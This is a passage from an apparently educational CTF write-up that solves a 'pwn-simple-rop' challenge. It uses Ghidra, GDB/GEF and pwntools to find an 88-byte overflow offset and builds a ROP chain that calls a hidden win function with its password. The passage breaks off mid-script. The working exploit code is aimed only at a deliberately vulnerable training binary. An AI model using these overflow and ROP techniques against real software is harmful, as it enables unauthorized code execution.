</span><span id=__span-10-31><a href=#__codelineno-10-31 id=__codelineno-10-31 name=__codelineno-10-31></a><span class=w>  </span><span class=n>FUN_0040a1c0</span><span class=p>(</span><span class=o>&amp;</span><span class=n>DAT_0047a161</span><span class=p>);</span>
</span><span id=__span-10-32><a href=#__codelineno-10-32 id=__codelineno-10-32 name=__codelineno-10-32></a><span class=w>  </span><span class=n>FUN_00410690</span><span class=p>(</span><span class=n>local_58</span><span class=p>);</span>
</span><span id=__span-10-33><a href=#__codelineno-10-33 id=__codelineno-10-33 name=__codelineno-10-33></a><span class=w>  </span><span class=n>FUN_0040a1c0</span><span class=p>(</span><span class=s>"</span><span class=se>\n</span><span class=s>nice to meet ya %s!</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=n>local_58</span><span class=p>);</span>
</span><span id=__span-10-34><a href=#__codelineno-10-34 id=__codelineno-10-34 name=__codelineno-10-34></a><span class=w>  </span><span class=n>FUN_00410930</span><span class=p>(</span><span class=s>"let</span><span class=se>\'</span><span class=s>s test your binary exploitation skills. only the best hackers can join our team. .."</span><span class=p>);</span>
</span><span id=__span-10-35><a href=#__codelineno-10-35 id=__codelineno-10-35 name=__codelineno-10-35></a><span class=w>  </span><span class=n>FUN_00410930</span><span class=p>(</span><span class=s>"i am not impressed. this meeting is over."</span><span class=p>);</span>
</span><span id=__span-10-36><a href=#__codelineno-10-36 id=__codelineno-10-36 name=__codelineno-10-36></a><span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-10-37><a href=#__codelineno-10-37 id=__codelineno-10-37 name=__codelineno-10-37></a><span class=p>}</span>
</span></code></pre></div> <p>So from reading the decompilation, we can tell that the first function is obviously the <code>win</code> func, but in addition, we see that it takes a parameter, which is compared against <code>sluggggggggggggggggggsecure_umm_yeah_i_sure_hope_it_is</code>. This tells us that we're going to need to most likely use ROP (return oriented programming) to create a chain of gadgets (instructions) to load it into memory since within the code, this function is never called. In addition, Ghidra also tells us the address of the win function (since the binary is stripped, Ghidra names functions FUN_<addr>). So <code>0x4016f5</code> is our <code>win</code> func.</addr></p> <p>Let's start off doing the same thing as the previous challenge, using a cyclic pattern to figure out an offset to control RSP.</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-11-1><a href=#__codelineno-11-1 id=__codelineno-11-1 name=__codelineno-11-1></a>$ gdb -q chall 
</span><span id=__span-11-2><a href=#__codelineno-11-2 id=__codelineno-11-2 name=__codelineno-11-2></a>Reading symbols from chall...
</span><span id=__span-11-3><a href=#__codelineno-11-3 id=__codelineno-11-3 name=__codelineno-11-3></a>(No debugging symbols found in chall)
</span><span id=__span-11-4><a href=#__codelineno-11-4 id=__codelineno-11-4 name=__codelineno-11-4></a>
</span><span id=__span-11-5><a href=#__codelineno-11-5 id=__codelineno-11-5 name=__codelineno-11-5></a>gef➤  pattern create 100
</span><span id=__span-11-6><a href=#__codelineno-11-6 id=__codelineno-11-6 name=__codelineno-11-6></a>[+] Generating a pattern of 100 bytes (n=8)
</span><span id=__span-11-7><a href=#__codelineno-11-7 id=__codelineno-11-7 name=__codelineno-11-7></a>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
</span><span id=__span-11-8><a href=#__codelineno-11-8 id=__codelineno-11-8 name=__codelineno-11-8></a>[+] Saved as '$_gef0'
</span><span id=__span-11-9><a href=#__codelineno-11-9 id=__codelineno-11-9 name=__codelineno-11-9></a>
</span><span id=__span-11-10><a href=#__codelineno-11-10 id=__codelineno-11-10 name=__codelineno-11-10></a>gef➤  run
</span><span id=__span-11-11><a href=#__codelineno-11-11 id=__codelineno-11-11 name=__codelineno-11-11></a>Starting program: /pwn-simple-rop/chall 
</span><span id=__span-11-12><a href=#__codelineno-11-12 id=__codelineno-11-12 name=__codelineno-11-12></a>=== Slug Security Technical Interview ===
</span><span id=__span-11-13><a href=#__codelineno-11-13 id=__codelineno-11-13 name=__codelineno-11-13></a>welcome candidate! before we begin, please tell us your name....
</span><span id=__span-11-14><a href=#__codelineno-11-14 id=__codelineno-11-14 name=__codelineno-11-14></a>&gt; aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
</span><span id=__span-11-15><a href=#__codelineno-11-15 id=__codelineno-11-15 name=__codelineno-11-15></a>
</span><span id=__span-11-16><a href=#__codelineno-11-16 id=__codelineno-11-16 name=__codelineno-11-16></a>[...]
</span><span id=__span-11-17><a href=#__codelineno-11-17 id=__codelineno-11-17 name=__codelineno-11-17></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
</span><span id=__span-11-18><a href=#__codelineno-11-18 id=__codelineno-11-18 name=__codelineno-11-18></a>0x00007fffffffd988│+0x0000: "laaaaaaamaaa"       ← $rsp
</span><span id=__span-11-19><a href=#__codelineno-11-19 id=__codelineno-11-19 name=__codelineno-11-19></a>0x00007fffffffd990│+0x0008: 0x000000006161616d ("maaa"?)
</span><span id=__span-11-20><a href=#__codelineno-11-20 id=__codelineno-11-20 name=__codelineno-11-20></a>0x00007fffffffd998│+0x0010: 0x00000000004017ae  →   push rbp
</span><span id=__span-11-21><a href=#__codelineno-11-21 id=__codelineno-11-21 name=__codelineno-11-21></a>0x00007fffffffd9a0│+0x0018: 0x0000000100000018
</span><span id=__span-11-22><a href=#__codelineno-11-22 id=__codelineno-11-22 name=__codelineno-11-22></a>0x00007fffffffd9a8│+0x0020: 0x00007fffffffdb48  →  0x00007fffffffdf03  →  "/pwn-simple-rop/[...]"
</span><span id=__span-11-23><a href=#__codelineno-11-23 id=__codelineno-11-23 name=__codelineno-11-23></a>0x00007fffffffd9b0│+0x0028: 0x00007fffffffdb58  →  0x00007fffffffdf3b  →  "CLUTTER_IM_MODULE=ibus"
</span><span id=__span-11-24><a href=#__codelineno-11-24 id=__codelineno-11-24 name=__codelineno-11-24></a>0x00007fffffffd9b8│+0x0030: 0x919b51f97047a5a4
</span><span id=__span-11-25><a href=#__codelineno-11-25 id=__codelineno-11-25 name=__codelineno-11-25></a>0x00007fffffffd9c0│+0x0038: 0x0000000000000001
</span><span id=__span-11-26><a href=#__codelineno-11-26 id=__codelineno-11-26 name=__codelineno-11-26></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span><span id=__span-11-27><a href=#__codelineno-11-27 id=__codelineno-11-27 name=__codelineno-11-27></a>[#0] Id 1, Name: "chall", stopped 0x401860 in ?? (), reason: SIGSEGV
</span><span id=__span-11-28><a href=#__codelineno-11-28 id=__codelineno-11-28 name=__codelineno-11-28></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span><span id=__span-11-29><a href=#__codelineno-11-29 id=__codelineno-11-29 name=__codelineno-11-29></a>[#0] 0x401860 → ret 
</span><span id=__span-11-30><a href=#__codelineno-11-30 id=__codelineno-11-30 name=__codelineno-11-30></a>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span><span id=__span-11-31><a href=#__codelineno-11-31 id=__codelineno-11-31 name=__codelineno-11-31></a>
</span><span id=__span-11-32><a href=#__codelineno-11-32 id=__codelineno-11-32 name=__codelineno-11-32></a>gef➤  pattern search $rsp
</span><span id=__span-11-33><a href=#__codelineno-11-33 id=__codelineno-11-33 name=__codelineno-11-33></a>[+] Searching for '6c61616161616161'/'616161616161616c' with period=8
</span><span id=__span-11-34><a href=#__codelineno-11-34 id=__codelineno-11-34 name=__codelineno-11-34></a>[+] Found at offset 88 (little-endian search) likely
</span></code></pre></div> <p>So we have an offset of 88. Similar to last time, we need to make sure it's stack aligned so we'll do the same exact thing to align it. Here's our exploit script so far:</p> <div class="language-py highlight"><pre><span></span><code><span id=__span-12-1><a href=#__codelineno-12-1 id=__codelineno-12-1 name=__codelineno-12-1></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span><span id=__span-12-2><a href=#__codelineno-12-2 id=__codelineno-12-2 name=__codelineno-12-2></a><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>'./chall'</span><span class=p>)</span>
</span><span id=__span-12-3><a href=#__codelineno-12-3 id=__codelineno-12-3 name=__codelineno-12-3></a>
</span><span id=__span-12-4><a href=#__codelineno-12-4 id=__codelineno-12-4 name=__codelineno-12-4></a><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>'./chall'</span><span class=p>)</span>
</span><span id=__span-12-5><a href=#__codelineno-12-5 id=__codelineno-12-5 name=__codelineno-12-5></a><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
</span><span id=__span-12-6><a href=#__codelineno-12-6 id=__codelineno-12-6 name=__codelineno-12-6></a>
</span><span id=__span-12-7><a href=#__codelineno-12-7 id=__codelineno-12-7 name=__codelineno-12-7></a><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>'A'</span> <span class=o>*</span> <span class=mi>88</span> <span class=c1># offset to control rsp, found using cyclic pattern</span>
</span><span id=__span-12-8><a href=#__codelineno-12-8 id=__codelineno-12-8 name=__codelineno-12-8></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>'ret'</span><span class=p>])[</span><span class=mi>0</span><span class=p>])</span> <span class=c1># align stack</span>
</span><span id=__span-12-9><a href=#__codelineno-12-9 id=__codelineno-12-9 name=__codelineno-12-9></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4016f5</span><span class=p>)</span>
</span><span id=__span-12-10><a href=#__codelineno-12-10 id=__codelineno-12-10 name=__codelineno-12-10></a>
</span><span id=__span-12-11><a href=#__codelineno-12-11 id=__codelineno-12-11 name=__codelineno-12-11></a><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>'&gt; '</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span><span id=__span-12-12><a href=#__codelineno-12-12 id=__codelineno-12-12 name=__codelineno-12-12></a><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></code></pre></div> <p>Running it we get:</p> <div class="language-bash highlight"><pre><span></span><code><span id=__span-13-1><a href=#__codelineno-13-1 id=__codelineno-13-1 name=__codelineno-13-1></a>$<span class=w> </span>python<span class=w> </span>solve.py<span class=w> </span>
</span><span id=__span-13-2><a href=#__codelineno-13-2 id=__codelineno-13-2 name=__codelineno-13-2></a><span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>'./chall'</span>:<span class=w> </span>pid<span class=w> </span><span class=m>841665</span>
</span><span id=__span-13-3><a href=#__codelineno-13-3 id=__codelineno-13-3 name=__codelineno-13-3></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>'/pwn-simple-rop/chall'</span>
</span><span id=__span-13-4><a href=#__codelineno-13-4 id=__codelineno-13-4 name=__codelineno-13-4></a><span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
</span><span id=__span-13-5><a href=#__codelineno-13-5 id=__codelineno-13-5 name=__codelineno-13-5></a><span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
</span><span id=__span-13-6><a href=#__codelineno-13-6 id=__codelineno-13-6 name=__codelineno-13-6></a><span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
</span><span id=__span-13-7><a href=#__codelineno-13-7 id=__codelineno-13-7 name=__codelineno-13-7></a><span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>disabled
</span><span id=__span-13-8><a href=#__codelineno-13-8 id=__codelineno-13-8 name=__codelineno-13-8></a><span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
</span><span id=__span-13-9><a href=#__codelineno-13-9 id=__codelineno-13-9 name=__codelineno-13-9></a><span class=w>    </span>RWX:<span class=w>      </span>Has<span class=w> </span>RWX<span class=w> </span>segments
</span><span id=__span-13-10><a href=#__codelineno-13-10 id=__codelineno-13-10 name=__codelineno-13-10></a><span class=o>[</span>+<span class=o>]</span><span class=w> </span>Receiving<span class=w> </span>all<span class=w> </span>data:<span class=w> </span>Done<span class=w> </span><span class=o>(</span>295B<span class=o>)</span>
</span><span id=__span-13-11><a href=#__codelineno-13-11 id=__codelineno-13-11 name=__codelineno-13-11></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span>Process<span class=w> </span><span class=s1>'./chall'</span><span class=w> </span>stopped<span class=w> </span>with<span class=w> </span><span class=nb>exit</span><span class=w> </span>code<span class=w> </span>-7<span class=w> </span><span class=o>(</span>SIGBUS<span class=o>)</span><span class=w> </span><span class=o>(</span>pid<span class=w> </span><span class=m>841665</span><span class=o>)</span>
</span><span id=__span-13-12><a href=#__codelineno-13-12 id=__codelineno-13-12 name=__codelineno-13-12></a>
</span><span id=__span-13-13><a href=#__codelineno-13-13 id=__codelineno-13-13 name=__codelineno-13-13></a>nice<span class=w> </span>to<span class=w> </span>meet<span class=w> </span>ya<span class=w> </span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class=se>\x</span><span class=m>16</span>@!
</span><span id=__span-13-14><a href=#__codelineno-13-14 id=__codelineno-13-14 name=__codelineno-13-14></a>let<span class=err>'</span>s<span class=w> </span><span class=nb>test</span><span class=w> </span>your<span class=w> </span>binary<span class=w> </span>exploitation<span class=w> </span>skills.<span class=w> </span>only<span class=w> </span>the<span class=w> </span>best<span class=w> </span>hackers<span class=w> </span>can<span class=w> </span>join<span class=w> </span>our<span class=w> </span>team...
</span><span id=__span-13-15><a href=#__codelineno-13-15 id=__codelineno-13-15 name=__codelineno-13-15></a>i<span class=w> </span>am<span class=w> </span>not<span class=w> </span>impressed.<span class=w> </span>this<span class=w> </span>meeting<span class=w> </span>is<span class=w> </span>over.
</span><span id=__span-13-16><a href=#__codelineno-13-16 id=__codelineno-13-16 name=__codelineno-13-16></a>sorry<span class=w> </span>no<span class=w> </span>can<span class=w> </span><span class=k>do</span><span class=w> </span>buddy,<span class=w> </span>wrong<span class=w> </span>password,<span class=w> </span>turn<span class=w> </span>back<span class=w> </span>around
</span></code></pre></div> <p>Ok sweet, so we got into the win function, but we still need to give it the password. How do we do that? Well, the beauty of this challenge is that we need to create a ROP chain, essentially picking assembly instructions within the binary to create a custom flow - in our case, we want to load the password for the win function into memory. Before we do that, let's figure out what's happening with that password check.</p> <p>Within Ghidra we can see the following stripped function call:</p> <figure> <a class=glightbox data-type=image data-width=auto data-height=auto data-title="Stripped function call within Ghidra" data-desc-position=bottom><img alt="Stripped function call within Ghidra" data-description loading=lazy src=../2024/cse132-hw4/_assets/strcmp-ghidra.png title></a> </figure> <p>At <code>0x40171b</code>, we call this function, and if it returns a 0, then we continue; anything else and it's an incorrect password. If you've ever programmed in C, you can tell that this behaves as <code>strcmp</code> would. Now, there are two ways you can go about this: either you can read the assembly from the listing view within Ghidra to see that the parameter it's compared against is loaded into the RDI register, or you can set a breakpoint in GDB at that call to see what the program is doing.</p> <p>Let's try the GDB method by converting our <code>process('./chall')</code> call to <code>gdb.debug('./chall', 'b *0x40171b')</code>. GEF quickly makes light work for us by telling us what the arguments are for this function call:</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-14-1><a href=#__codelineno-14-1 id=__codelineno-14-1 name=__codelineno-14-1></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
</span><span id=__span-14-2><a href=#__codelineno-14-2 id=__codelineno-14-2 name=__codelineno-14-2></a>0x4010a0 (
</span><span id=__span-14-3><a href=#__codelineno-14-3 id=__codelineno-14-3 name=__codelineno-14-3></a>   $rdi = 0x00000000004a9190 → 0x0000000000000000,
</span><span id=__span-14-4><a href=#__codelineno-14-4 id=__codelineno-14-4 name=__codelineno-14-4></a>   $rsi = 0x000000000047a008 → "sluggggggggggggggggggsecure_umm_yeah_i_sure_hope_i[...]",
</span><span id=__span-14-5><a href=#__codelineno-14-5 id=__codelineno-14-5 name=__codelineno-14-5></a>   $rdx = 0x000000000047a008 → "sluggggggggggggggggggsecure_umm_yeah_i_sure_hope_i[...]"
</span><span id=__span-14-6><a href=#__codelineno-14-6 id=__codelineno-14-6 name=__codelineno-14-6></a>)
</span><span id=__span-14-7><a href=#__codelineno-14-7 id=__codelineno-14-7 name=__codelineno-14-7></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span><span id=__span-14-8><a href=#__codelineno-14-8 id=__codelineno-14-8 name=__codelineno-14-8></a>[#0] Id 1, Name: "chall", stopped 0x40171b in ?? (), reason: BREAKPOINT
</span><span id=__span-14-9><a href=#__codelineno-14-9 id=__codelineno-14-9 name=__codelineno-14-9></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span><span id=__span-14-10><a href=#__codelineno-14-10 id=__codelineno-14-10 name=__codelineno-14-10></a>[#0] 0x40171b → call 0x4010a0
</span><span id=__span-14-11><a href=#__codelineno-14-11 id=__codelineno-14-11 name=__codelineno-14-11></a>[#1] 0x401700 → mov QWORD PTR [rbp-0x118], rdi
</span></code></pre></div> <p>As you can see, our RDI is empty because we never passed in an argument to the function. So let's do that.</p> <h3 id=passing-in-a-password>Passing In A Password<a class=headerlink href=#passing-in-a-password title="Permanent link">¶</a></h3> <p>The way we want to do this is by popping a value into RDI (we pop things to registers using "pop" gadgets, which are assembly instructions that load values from the stack into registers). First, we need to find a <code>pop rdi</code> gadget in our binary to help set up our function call. We also want to <code>ret</code> so we maintain proper stack alignment. There are a few ways we can do this, but since we're already using pwnlib, we can just use the integrated ROP library, just like we did in the Simple Win challenge. Then pass in our password!</p> <p>Here's our solve script so far:</p> <div class="language-py highlight"><pre><span></span><code><span id=__span-15-1><a href=#__codelineno-15-1 id=__codelineno-15-1 name=__codelineno-15-1></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span><span id=__span-15-2><a href=#__codelineno-15-2 id=__codelineno-15-2 name=__codelineno-15-2></a><span class=n>p</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s1>'./chall'</span><span class=p>,</span> <span class=s1>'b *0x40171b'</span><span class=p>)</span> <span class=c1># strcmp within win func</span>
</span><span id=__span-15-3><a href=#__codelineno-15-3 id=__codelineno-15-3 name=__codelineno-15-3></a>
</span><span id=__span-15-4><a href=#__codelineno-15-4 id=__codelineno-15-4 name=__codelineno-15-4></a><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>'./chall'</span><span class=p>)</span>
</span><span id=__span-15-5><a href=#__codelineno-15-5 id=__codelineno-15-5 name=__codelineno-15-5></a><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
</span><span id=__span-15-6><a href=#__codelineno-15-6 id=__codelineno-15-6 name=__codelineno-15-6></a>
</span><span id=__span-15-7><a href=#__codelineno-15-7 id=__codelineno-15-7 name=__codelineno-15-7></a><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>'A'</span> <span class=o>*</span> <span class=mi>88</span> <span class=c1># offset to control rsp, found using cyclic pattern</span>
</span><span id=__span-15-8><a href=#__codelineno-15-8 id=__codelineno-15-8 name=__codelineno-15-8></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>'ret'</span><span class=p>])[</span><span class=mi>0</span><span class=p>])</span> <span class=c1># align stack</span>
</span><span id=__span-15-9><a href=#__codelineno-15-9 id=__codelineno-15-9 name=__codelineno-15-9></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>'pop rdi'</span><span class=p>,</span> <span class=s1>'ret'</span><span class=p>])[</span><span class=mi>0</span><span class=p>])</span> <span class=c1># pop arg into rdi since thats what strcmp is checking against</span>
</span><span id=__span-15-10><a href=#__codelineno-15-10 id=__codelineno-15-10 name=__codelineno-15-10></a><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>'sluggggggggggggggggggsecure_umm_yeah_i_sure_hope_it_is'</span>
</span><span id=__span-15-11><a href=#__codelineno-15-11 id=__codelineno-15-11 name=__codelineno-15-11></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4016f5</span><span class=p>)</span>
</span><span id=__span-15-12><a href=#__codelineno-15-12 id=__codelineno-15-12 name=__codelineno-15-12></a>
</span><span id=__span-15-13><a href=#__codelineno-15-13 id=__codelineno-15-13 name=__codelineno-15-13></a><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>'&gt; '</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span><span id=__span-15-14><a href=#__codelineno-15-14 id=__codelineno-15-14 name=__codelineno-15-14></a><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></code></pre></div> <p>Let's run it and see what happens:</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-16-1><a href=#__codelineno-16-1 id=__codelineno-16-1 name=__codelineno-16-1></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
</span><span id=__span-16-2><a href=#__codelineno-16-2 id=__codelineno-16-2 name=__codelineno-16-2></a>$rax   : 0x0               
</span><span id=__span-16-3><a href=#__codelineno-16-3 id=__codelineno-16-3 name=__codelineno-16-3></a>$rbx   : 0x00007ffc3b3d4ab8  →  0x00007ffc3b3d5f7e  →  "CLUTTER_IM_MODULE=ibus"
</span><span id=__span-16-4><a href=#__codelineno-16-4 id=__codelineno-16-4 name=__codelineno-16-4></a>$rcx   : 0x00000000004396e0  →  0x5877fffff0003d48 ("H="?)
</span><span id=__span-16-5><a href=#__codelineno-16-5 id=__codelineno-16-5 name=__codelineno-16-5></a>$rdx   : 0x1               
</span><span id=__span-16-6><a href=#__codelineno-16-6 id=__codelineno-16-6 name=__codelineno-16-6></a>$rsp   : 0x00007ffc3b3d4900  →  0x6767676767676767 ("gggggggg"?)
</span><span id=__span-16-7><a href=#__codelineno-16-7 id=__codelineno-16-7 name=__codelineno-16-7></a>$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
</span><span id=__span-16-8><a href=#__codelineno-16-8 id=__codelineno-16-8 name=__codelineno-16-8></a>$rsi   : 0x1               
</span><span id=__span-16-9><a href=#__codelineno-16-9 id=__codelineno-16-9 name=__codelineno-16-9></a>$rdi   : 0x6767676767756c73 ("sluggggg"?)
</span><span id=__span-16-10><a href=#__codelineno-16-10 id=__codelineno-16-10 name=__codelineno-16-10></a>$rip   : 0x0000000000401ea1  →   ret 
</span><span id=__span-16-11><a href=#__codelineno-16-11 id=__codelineno-16-11 name=__codelineno-16-11></a>$r8    : 0x000000001b9d0797  →  0x0000000000000000
</span><span id=__span-16-12><a href=#__codelineno-16-12 id=__codelineno-16-12 name=__codelineno-16-12></a>$r9    : 0x0               
</span><span id=__span-16-13><a href=#__codelineno-16-13 id=__codelineno-16-13 name=__codelineno-16-13></a>$r10   : 0xffffffff        
</span><span id=__span-16-14><a href=#__codelineno-16-14 id=__codelineno-16-14 name=__codelineno-16-14></a>$r11   : 0x202             
</span><span id=__span-16-15><a href=#__codelineno-16-15 id=__codelineno-16-15 name=__codelineno-16-15></a>$r12   : 0x1               
</span><span id=__span-16-16><a href=#__codelineno-16-16 id=__codelineno-16-16 name=__codelineno-16-16></a>$r13   : 0x00007ffc3b3d4aa8  →  0x00007ffc3b3d5f76  →  0x006c6c6168632f2e ("./chall"?)
</span><span id=__span-16-17><a href=#__codelineno-16-17 id=__codelineno-16-17 name=__codelineno-16-17></a>$r14   : 0x1               
</span><span id=__span-16-18><a href=#__codelineno-16-18 id=__codelineno-16-18 name=__codelineno-16-18></a>$r15   : 0x1               
</span><span id=__span-16-19><a href=#__codelineno-16-19 id=__codelineno-16-19 name=__codelineno-16-19></a>$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
</span><span id=__span-16-20><a href=#__codelineno-16-20 id=__codelineno-16-20 name=__codelineno-16-20></a>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
</span><span id=__span-16-21><a href=#__codelineno-16-21 id=__codelineno-16-21 name=__codelineno-16-21></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span><span id=__span-16-22><a href=#__codelineno-16-22 id=__codelineno-16-22 name=__codelineno-16-22></a>[#0] Id 1, Name: "chall", stopped 0x401ea1 in ?? (), reason: SIGSEGV
</span><span id=__span-16-23><a href=#__codelineno-16-23 id=__codelineno-16-23 name=__codelineno-16-23></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span><span id=__span-16-24><a href=#__codelineno-16-24 id=__codelineno-16-24 name=__codelineno-16-24></a>[#0] 0x401ea1 → ret 
</span></code></pre></div> <p>Uh oh, seems like it segments. Why is that? Well, this is due to how we're passing the string to strcmp. Looking at our registers, we can see that RDI contains <code>"sluggggg"</code>, but this is being loaded directly from our payload as a value rather than as a pointer to a string in memory. <strong><code>strcmp</code> expects pointers to strings, not the string data itself</strong>.</p> <p>So instead of loading the actual password, we need to load the address of where the password is. We can do this in two ways: get the string address from Ghidra, or again, use pwnlib. Within pwnlib we can use <code>elf.search()</code> to get the location of the string. Here's that applied:</p> <h3 id=final-solution_1>Final Solution<a class=headerlink href=#final-solution_1 title="Permanent link">¶</a></h3> <div class="language-py highlight"><pre><span></span><code><span id=__span-17-1><a href=#__codelineno-17-1 id=__codelineno-17-1 name=__codelineno-17-1></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span><span id=__span-17-2><a href=#__codelineno-17-2 id=__codelineno-17-2 name=__codelineno-17-2></a><span class=n>p</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s1>'./chall'</span><span class=p>,</span> <span class=s1>'b *0x40171b'</span><span class=p>)</span> <span class=c1># strcmp within win func</span>
</span><span id=__span-17-3><a href=#__codelineno-17-3 id=__codelineno-17-3 name=__codelineno-17-3></a>
</span><span id=__span-17-4><a href=#__codelineno-17-4 id=__codelineno-17-4 name=__codelineno-17-4></a><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>'./chall'</span><span class=p>)</span>
</span><span id=__span-17-5><a href=#__codelineno-17-5 id=__codelineno-17-5 name=__codelineno-17-5></a><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
</span><span id=__span-17-6><a href=#__codelineno-17-6 id=__codelineno-17-6 name=__codelineno-17-6></a>
</span><span id=__span-17-7><a href=#__codelineno-17-7 id=__codelineno-17-7 name=__codelineno-17-7></a><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>'A'</span> <span class=o>*</span> <span class=mi>88</span> <span class=c1># offset to control rsp, found using cyclic pattern</span>
</span><span id=__span-17-8><a href=#__codelineno-17-8 id=__codelineno-17-8 name=__codelineno-17-8></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>'ret'</span><span class=p>])[</span><span class=mi>0</span><span class=p>])</span> <span class=c1># align stack</span>
</span><span id=__span-17-9><a href=#__codelineno-17-9 id=__codelineno-17-9 name=__codelineno-17-9></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>'pop rdi'</span><span class=p>,</span> <span class=s1>'ret'</span><span class=p>])[</span><span class=mi>0</span><span class=p>])</span> <span class=c1># pop arg into rdi since thats what strcmp is checking againsti</span>
</span><span id=__span-17-10><a href=#__codelineno-17-10 id=__codelineno-17-10 name=__codelineno-17-10></a>
</span><span id=__span-17-11><a href=#__codelineno-17-11 id=__codelineno-17-11 name=__codelineno-17-11></a><span class=n>password_addr</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>'sluggggggggggggggggggsecure_umm_yeah_i_sure_hope_it_is'</span><span class=p>))</span>
